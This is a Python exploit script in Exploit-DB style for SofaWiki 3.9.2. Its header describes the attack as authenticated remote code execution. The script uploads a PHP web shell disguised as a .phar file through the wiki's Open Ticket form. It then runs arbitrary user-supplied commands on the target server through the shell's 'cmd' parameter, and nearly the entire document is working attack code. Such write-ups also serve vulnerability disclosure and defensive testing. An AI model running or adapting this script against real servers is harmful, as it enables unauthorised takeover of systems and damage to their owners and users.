# Exploit Title: SofaWiki 3.9.2 - RCE (authenticated) via Open Ticket File Upload  Exploit
# Date: 10/17/2024
# Exploit Author: Chokri Hammedi
# Vendor Homepage: https://www.sofawiki.com
# Software Link: https://www.sofawiki.com/site/files/snapshot.zip
# Version: 3.9.2
# Tested on: Windows XP


import requests
import re
import sys

class SofaWikiExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()

    def upload_shell(self):
        print("\033[93m[*] Uploading shell...\033[0m")
        shell_content = '<?php system($_GET["cmd"]); ?>'
        files = {
            'uploadedfile': ('shell.phar', shell_content, 'application/octet-stream'),
            'title': (None, 'Chokri Hammedi Exploit'),
            'text': (None, 'Chokri Hammedi RCE'),
            'assigned': (None, 'admin'),
            'priority': (None, '1 high'),
            'submitopen': (None, 'Open Ticket'),
            'MAX_FILE_SIZE': (None, '8000000')
        }
        response = self.session.post(f"{self.base_url}/index.php?name=special:tickets", files=files)
        match = re.search(r'File (.*?) uploaded', response.text)
        if not match:
            print("\033[91m[-] Shell upload failed.\033[0m")
            sys.exit(1)
        shell_url = f"{self.base_url}/site/files/{match.group(1)}"
        print(f"\033[92m[+] Shell uploaded: {shell_url}\033[0m")
        return shell_url

    def execute_commands(self, shell_url, commands):
        for cmd in commands:
            print(f"\033[93m[*] Running command: {cmd}\033[0m")
            response = self.session.get(f"{shell_url}?cmd={cmd}")
            print("\033[92m[+] Command output:\033[0m")
            print(f"\033[1m{response.text}\033[0m")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"\033[91mUsage: {sys.argv[0]} <target_url> <cmd1> [cmd2] ...\033[0m")
        sys.exit(1)

    target_url = sys.argv[1]
    commands = sys.argv[2:]

    exploit = SofaWikiExploit(target_url)
    shell_url = exploit.upload_shell()
    exploit.execute_commands(shell_url, commands)
